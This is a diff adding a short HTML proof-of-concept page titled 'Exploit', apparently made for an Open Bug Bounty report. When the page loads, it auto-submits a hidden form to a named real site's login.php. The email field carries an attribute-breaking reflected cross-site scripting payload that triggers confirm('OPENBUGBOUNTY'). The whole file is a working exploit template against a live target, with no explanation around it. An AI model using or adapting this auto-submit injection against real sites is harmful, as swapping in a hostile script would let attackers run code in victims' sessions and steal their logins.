@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Exploit</title>
+</head>
+<body>
+    <form id="exploitForm" action="https://classmgmt.com/login.php" method="POST">
+        <input type="hidden" name="email" value="%22onmouseover%3D%22confirm%28%27OPENBUGBOUNTY%27%29">
+        <input type="hidden" name="password" value="password">
+    </form>
+    <script>
+        document.getElementById('exploitForm').submit();
+    </script>
+</body>
+</html>
